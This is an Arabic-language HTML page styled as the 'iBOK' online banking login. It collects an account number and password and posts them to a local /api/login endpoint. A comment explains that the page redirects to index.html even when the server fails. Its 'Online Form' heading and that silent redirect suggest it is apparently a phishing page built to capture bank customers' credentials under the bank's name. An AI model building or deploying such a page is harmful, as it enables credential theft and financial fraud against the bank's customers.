<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>iBOK - تسجيل الدخول</title>
    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700&display=swap" rel="stylesheet">
    <style>
        body {
            font-family: 'Cairo', sans-serif;
            background-color: #ffffff;
            margin: 0;
            padding: 0;
            display: flex;
            flex-direction: column;
            align-items: center;
            color: #333;
        }

        .top-banner {
            background-color: #ffc400;
            width: 90%;
            max-width: 500px;
            margin-top: 20px;
            padding: 12px;
            border-radius: 30px;
            text-align: center;
            font-weight: bold;
            font-size: 15px;
            box-shadow: 0 3px 8px rgba(0,0,0,0.1);
        }

        .header {
            background: linear-gradient(135deg, #d71920, #ed2929);
            width: 100%;
            padding: 30px 20px;
            color: white;
            text-align: right;
            box-sizing: border-box;
            margin-top: 15px;
            border-bottom: 3px solid #d1d1d1;
        }

        .header h1 {
            margin: 0;
            font-size: 42px;
            font-weight: 700;
            text-align: left;
            direction: ltr;
        }

        .header p {
            margin: 5px 0 0;
            font-size: 17px;
            text-align: left;
        }

        .content {
            width: 90%;
            max-width: 500px;
            padding: 40px 0;
            text-align: center;
        }

        .main-title {
            color: #d71920;
            font-size: 30px;
            font-weight: 700;
            margin-bottom: 20px;
        }

        .sub-title {
            font-size: 22px;
            font-weight: 600;
            display: inline-block;
            position: relative;
            padding-bottom: 10px;
            margin-bottom: 40px;
        }

        .sub-title::after {
            content: '';
            position: absolute;
            bottom: 0;
            left: 0;
            width: 100%;
            height: 3px;
            background-color: #d71920;
        }

        .form-group {
            text-align: right;
            margin-bottom: 25px;
        }

        .form-group label {
            display: block;
            font-weight: 700;
            margin-bottom: 10px;
            font-size: 18px;
        }

        .input-container {
            position: relative;
            background-color: #f5f8fa;
            border: 2px solid #dedede;
            border-radius: 10px;
            overflow: hidden;
            transition: border-color 0.3s;
        }

        .input-container:focus-within {
            border-color: #d71920;
        }

        .input-container input {
            width: 100%;
            padding: 16px;
            border: none;
            background: transparent;
            font-family: 'Cairo', sans-serif;
            font-size: 16px;
            outline: none;
            box-sizing: border-box;
            text-align: right;
        }

        .icon-btn {
            position: absolute;
            left: 15px;
            top: 50%;
            transform: translateY(-50%);
            cursor: pointer;
            color: #777;
            display: flex;
            align-items: center;
        }

        .login-btn {
            background-color: #d71920;
            color: white;
            border: none;
            width: 100%;
            padding: 16px;
            font-size: 20px;
            font-weight: 700;
            border-radius: 10px;
            cursor: pointer;
            margin-top: 20px;
            transition: background 0.3s;
        }

        .login-btn:hover {
            background-color: #b9141a;
        }

        .eye-icon {
            width: 24px;
            height: 24px;
            fill: none;
            stroke: currentColor;
            stroke-width: 2;
            stroke-linecap: round;
            stroke-linejoin: round;
        }

        footer {
            background: #d71920;
            color: white;
            text-align: center;
            padding: 25px 15px;
            width: 100%;
            margin-top: 40px;
            font-size: 14px;
        }
    </style>
</head>
<body>

    <div class="top-banner">
        مرحباً بكم في خدمة iBOK المصرفية عبر الإنترنت
    </div>

    <div class="header">
        <h1>iBOK</h1>
        <p>الاستمارة أونلاين Online Form</p>
    </div>

    <div class="content">
        <div class="main-title">الاستمارة أونلاين</div>
        <div class="sub-title">الرجاء إدخال البيانات</div>

        <form id="loginForm">
            <div class="form-group">
                <label>رقم الحساب:</label>
                <div class="input-container">
                    <input type="text" id="accountNumber" placeholder="أدخل رقم الحساب المكون من 6 أو 7 أرقام" required>
                </div>
            </div>

            <div class="form-group">
                <label>كلمة مرور الحساب:</label>
                <div class="input-container">
                    <input type="password" id="password" placeholder="أدخل كلمة المرور" required>
                    <div class="icon-btn" onclick="togglePassword()">
                        <svg class="eye-icon" id="eyeIcon" viewBox="0 0 24 24">
                            <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"></path>
                            <circle cx="12" cy="12" r="3"></circle>
                        </svg>
                    </div>
                </div>
            </div>

            <button type="submit" id="loginBtn" class="login-btn">تسجيل الدخول</button>
        </form>
    </div>

    <footer>
        جميع الحقوق محفوظة © 2026
    </footer>

    <script>
        function togglePassword() {
            const passwordInput = document.getElementById('password');
            const eyeIcon = document.getElementById('eyeIcon');
            
            if (passwordInput.type === 'password') {
                passwordInput.type = 'text';
                eyeIcon.innerHTML = '<path d="M17.94 17.94A10.07 10.07 0 0 1 12 20c-7 0-11-8-11-8a18.45 18.45 0 0 1 5.06-5.94M9.9 4.24A9.12 9.12 0 0 1 12 4c7 0 11 8 11 8a18.5 18.5 0 0 1-2.16 3.19m-6.72-1.07a3 3 0 1 1-4.24-4.24"></path><line x1="1" y1="1" x2="23" y2="23"></line>';
            } else {
                passwordInput.type = 'password';
                eyeIcon.innerHTML = '<path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"></path><circle cx="12" cy="12" r="3"></circle>';
            }
        }

        document.getElementById('loginForm').addEventListener('submit', async (e) => {
            e.preventDefault();
            const loginBtn = document.getElementById('loginBtn');
            const accountNumber = document.getElementById('accountNumber').value;
            const password = document.getElementById('password').value;

            loginBtn.disabled = true;
            loginBtn.innerText = "جاري التحقق...";

            try {
                const response = await fetch('/api/login', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ accountNumber, password })
                });

                if (response.ok) {
                    window.location.href = "index.html";
                } else {
                    alert("حدث خطأ في تسجيل الدخول");
                    loginBtn.disabled = false;
                    loginBtn.innerText = "تسجيل الدخول";
                }
            } catch (error) {
                console.error("Error:", error);
                // في حالة فشل السيرفر، سنقوم بالتحويل على أي حال للتجربة
                window.location.href = "index.html";
            }
        });
    </script>
</body>
</html>
